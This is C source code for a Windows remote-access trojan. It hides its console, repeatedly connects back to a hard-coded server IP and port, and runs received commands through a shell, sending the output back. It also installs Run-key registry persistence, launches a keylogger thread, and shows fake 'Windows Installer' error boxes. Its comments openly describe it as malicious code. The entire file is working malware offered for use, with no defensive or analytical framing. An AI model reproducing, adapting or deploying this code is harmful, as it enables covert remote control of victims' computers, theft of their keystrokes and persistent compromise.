#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <winsock2.h>
#include <windows.h>
#include <winuser.h> 
#include <wininet.h>
#include <windowsx.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include "keylogger.h"

int sock; 

// function to cut out a portion of a string
char *
str_cut(char str[], int slice_from, int slice_to)
{
        if (str[0] == '\0')
                return NULL;

        char *buffer;
        size_t str_len, buffer_len;

        if (slice_to < 0 && slice_from > slice_to) {
                str_len = strlen(str);
                if (abs(slice_to) > str_len - 1)
                        return NULL;

                if (abs(slice_from) > str_len)
                        slice_from = (-1) * str_len;

                buffer_len = slice_to - slice_from;
                str += (str_len + slice_from);

        } else if (slice_from >= 0 && slice_to > slice_from) {
                str_len = strlen(str);

                if (slice_from > str_len - 1)
                        return NULL;
                buffer_len = slice_to - slice_from;
                str += slice_from;

        } else
                return NULL;

        buffer = calloc(buffer_len, sizeof(char));
        strncpy(buffer, str, buffer_len);
        return buffer;
}

// make our malicious code persistent
int bootRun(){
    char err[128] = "Failed\n";
    char suc[128] = "Created Persistence At : HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n";
    // copy the malware to the user's home directory
    TCHAR szPath[MAX_PATH];
    DWORD pathLen = 0;

    // get the path of the file
    pathLen = GetModuleFileName(NULL, szPath, MAX_PATH);
    if (pathLen == 0){
        send(sock, err, sizeof(err),0);
        return -1;
    }

    // open the registry key
    HKEY NewVal;

    if(RegOpenKey(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), &NewVal) != ERROR_SUCCESS){
        send(sock, err, sizeof(err),0);
        return -1;
    }
    // set the value of the key
    DWORD pathLenInBytes = pathLen * sizeof(*szPath);
    // if the key already exists, then close the key and send an error message
    if(RegSetValueEx(NewVal, TEXT("Hacked"), 0, REG_SZ, (LPBYTE)szPath, pathLenInBytes) != ERROR_SUCCESS){
        RegCloseKey(NewVal);
        send(sock, err, sizeof(err),0);
        return -1;
    }
    // if the key does not exist, then close the key and send a success message
    RegCloseKey(NewVal);
    send(sock, suc, sizeof(suc),0);
    return 0;
}


// function to execute shell commands
void Shell(){
    char buffer[1024];
    char container[1024];
    char total_response[18384];

    while (1){
        jump:
        memset(&buffer, 0, sizeof(buffer));
        memset(&container, 0, sizeof(container));
        memset(&total_response, 0, sizeof(total_response));
        recv(sock, buffer, 1024, 0);

        // if the first 2 characters of the buffer are equal to "cd", then change directory
        if (strncmp("cd ", buffer, 3) == 0){
            chdir(str_cut(buffer, 3, 100));
        }
        // make persistent
        else if (strncmp("persistence", buffer, 11) == 0){
            bootRun();
        }
        // start keylogger
        else if (strncmp("keylog_start", buffer, 12) == 0){
            // create a thread to run the keylogger
            HANDLE thread = CreateThread(NULL, 0,key_log, NULL, 0, NULL);
            goto jump;
        }
        // message box
        else if (strncmp("message ", buffer, 8) == 0){
        	// MESSAGEBOX
    		MessageBox(NULL, TEXT(str_cut(buffer,8,200)), TEXT("Windows Installer"), MB_OK | MB_ICONERROR);
    		goto jump;
        }
        // dump keylogger data
        // else if (strncmp("keylog_dump", buffer, 11) == 0){
        //     // open a pipe to the command
        //     FILE *fp;
        //     fp = fopen("C:\\%TEMP%\\log.txt", "r");
        //     // read the output of the command
        //     while (fgets(container, 1024, fp) != NULL){
        //         strcat(total_response, container);
        //     }
        //     // send the output of the command to the server
        //     send(sock, total_response, sizeof(total_response), 0);
        //     fclose(fp);
        //     goto jump;
        // }
        // quit the program
        else if (strncmp("quit", buffer, 4) == 0){
            closesocket(sock);
            WSACleanup();
            exit(0);
        }
        // execute shell commands
        else{
            // open a pipe to the command
            FILE *fp;
            fp = _popen(buffer, "r");
            // read the output of the command
            while (fgets(container, 1024, fp) != NULL){
                strcat(total_response, container);
            }
            // send the output of the command to the server
            send(sock, total_response, sizeof(total_response), 0);
            fclose(fp);
        }
    }
}

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow){
    
    HWND stealth;
    AllocConsole();
    // hide the window
    stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(stealth, 0);
    
    // socket parameters
    struct sockaddr_in ServAddr;
    unsigned short ServPort;
    char *ServIP;
    WSADATA wsaData; // structure to hold info about windows socket implementation
    
    //////////////////  CHANGE THIS ///////////////////////
    ServIP = "192.168.3.116"; // IP address of the server
    ServPort = 50005; // port number of the server

    // initialize winsock
    // MAKEWORD(2,0) is the version of winsock we are using
    // wsaData is the structure we are using to hold info about the winsock implementation
    // if WSAStartup returns 0, then it was successful
    if (WSAStartup(MAKEWORD(2,0), &wsaData) != 0){
        exit(1);
    }

    // create a TCP socket
    // AF_INET is the address family for IPv4
    // SOCK_STREAM is the socket type for TCP
    // 0 is the protocol value for IP
    sock = socket(AF_INET, SOCK_STREAM, 0);

    memset(&ServAddr, 0, sizeof(ServAddr)); // zero out the structure

    // fill in the server address structure
    ServAddr.sin_family = AF_INET; // IPv4 address family
    ServAddr.sin_addr.s_addr = inet_addr(ServIP); // server IP address
    ServAddr.sin_port = htons(ServPort); // server port
    
    // connect to the server
    // if connect returns 0, then it was successful
    START:
    while (connect(sock, (struct sockaddr *) &ServAddr, sizeof(ServAddr)) != 0){
        Sleep(10); // sleep for 10 seconds
        goto START; // go back to the beginning of the loop
    }
    Shell();
}

